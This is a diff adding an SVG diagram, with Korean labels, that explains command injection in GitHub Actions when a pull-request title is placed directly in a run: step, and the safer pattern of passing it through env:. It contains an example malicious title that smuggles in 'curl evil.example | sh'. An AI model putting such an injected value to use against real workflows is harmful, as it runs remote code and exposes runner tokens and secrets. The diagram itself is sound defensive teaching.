@@ -1,0 +1,34 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 860 420" font-family="-apple-system, BlinkMacSystemFont, 'Apple SD Gothic Neo', sans-serif">
+<title>PR 제목을 run에 직접 넣을 때와 env로 넘길 때</title>
+<defs><marker id="a-red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#b91c1c"/></marker><marker id="a-green" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#15803d"/></marker></defs>
+<rect width="860" height="420" rx="16" fill="#ffffff"/>
+<text x="32" y="36" font-size="17" fill="#1f2937" font-weight="700">PR 제목을 run에 직접 넣는 경우와 env로 전달하는 경우</text>
+<text x="32" y="56" font-size="11" fill="#6b7280">PR 제목: x&quot;; curl evil.example | sh; echo &quot;</text>
+<text x="32" y="92" font-size="13" fill="#b91c1c" font-weight="700">직접 넣기: run 안에 &quot;${{ …title }}&quot;</text>
+<rect x="32" y="104" width="390" height="60" rx="10" fill="#f9fafb" stroke="#9ca3af" stroke-width="1.5"/>
+<text x="48" y="128" font-size="12" fill="#374151" font-weight="700">① Actions가 표현식을 먼저 치환</text>
+<text x="48" y="148" font-size="11" fill="#6b7280">셸 실행 전에 스크립트 본문의 문자열이 바뀐다</text>
+<line x1="227" y1="164" x2="227" y2="188" stroke="#b91c1c" stroke-width="1.8" marker-end="url(#a-red)"/>
+<rect x="32" y="190" width="390" height="70" rx="10" fill="#fef2f2" stroke="#b91c1c" stroke-width="1.5"/>
+<text x="48" y="214" font-size="12" fill="#b91c1c" font-weight="700">② 셸이 받는 스크립트</text>
+<text x="48" y="236" font-size="11" fill="#374151" font-family="ui-monospace, Menlo, monospace">[[ "x"; curl evil.example | sh; echo "" =~ … ]]</text>
+<text x="48" y="252" font-size="11" fill="#6b7280">따옴표가 닫히고 curl이 별도 명령이 된다</text>
+<line x1="227" y1="260" x2="227" y2="284" stroke="#b91c1c" stroke-width="1.8" marker-end="url(#a-red)"/>
+<rect x="32" y="286" width="390" height="56" rx="10" fill="#fef2f2" stroke="#b91c1c" stroke-width="1.5"/>
+<text x="227" y="312" font-size="13" fill="#b91c1c" font-weight="700" text-anchor="middle">③ curl … | sh 실행</text>
+<text x="227" y="330" font-size="11" fill="#374151" text-anchor="middle">러너의 토큰·Secrets에 접근 가능</text>
+<text x="438" y="92" font-size="13" fill="#15803d" font-weight="700">env로 전달: env의 TITLE, run의 &quot;$TITLE&quot;</text>
+<rect x="438" y="104" width="390" height="60" rx="10" fill="#f9fafb" stroke="#9ca3af" stroke-width="1.5"/>
+<text x="454" y="128" font-size="12" fill="#374151" font-weight="700">① 표현식은 환경 변수 값으로만 치환</text>
+<text x="454" y="148" font-size="11" fill="#6b7280">스크립트 본문은 바뀌지 않는다</text>
+<line x1="633" y1="164" x2="633" y2="188" stroke="#15803d" stroke-width="1.8" marker-end="url(#a-green)"/>
+<rect x="438" y="190" width="390" height="70" rx="10" fill="#ecfdf5" stroke="#15803d" stroke-width="1.5"/>
+<text x="454" y="214" font-size="12" fill="#15803d" font-weight="700">② 셸이 받는 스크립트</text>
+<text x="454" y="236" font-size="11" fill="#374151" font-family="ui-monospace, Menlo, monospace">[[ ! "$TITLE" =~ $message ]]</text>
+<text x="454" y="252" font-size="11" fill="#6b7280">구문 해석이 끝난 뒤 $TITLE이 값으로 확장된다</text>
+<line x1="633" y1="260" x2="633" y2="284" stroke="#15803d" stroke-width="1.8" marker-end="url(#a-green)"/>
+<rect x="438" y="286" width="390" height="56" rx="10" fill="#ecfdf5" stroke="#15803d" stroke-width="1.5"/>
+<text x="633" y="312" font-size="13" fill="#15803d" font-weight="700" text-anchor="middle">③ 정규식 비교만 실행</text>
+<text x="633" y="330" font-size="11" fill="#374151" text-anchor="middle">제목은 규칙 위반으로 보고된다</text>
+<text x="32" y="384" font-size="12" fill="#1f2937">PR 제목·브랜치 이름처럼 PR 작성자가 정하는 값은 run: 안에 ${{ }}로 쓰지 않고 env:로 전달한다</text>
+</svg>
